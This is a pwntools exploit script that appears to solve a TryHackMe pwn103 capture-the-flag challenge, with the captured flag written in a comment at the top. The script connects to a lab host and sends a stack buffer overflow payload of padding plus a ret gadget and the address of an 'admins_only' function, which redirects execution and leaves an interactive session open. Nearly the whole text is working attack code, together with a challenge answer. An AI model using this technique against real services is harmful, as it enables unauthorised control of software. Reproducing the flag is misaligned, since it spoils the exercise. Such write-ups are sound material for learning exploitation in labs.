#THM{w3lC0m3_4Dm1N}
from pwn import *

host  = '10.10.226.246' 
port = 9003
elf = ELF('./pwn103-1644300337872.pwn103')
# p = elf.process()
rop = ROP(elf)
ret = rop.find_gadget(['ret'])[0]
p = remote(host, port)

p.recvuntil(b'Choose the channel: ')
p.sendline(b'3')
p.recvuntil(b'------[pwner]: ')
payload = b"A"*40 + p64(ret) + p64(elf.symbols['admins_only'])
p.sendline(payload)

p.interactive()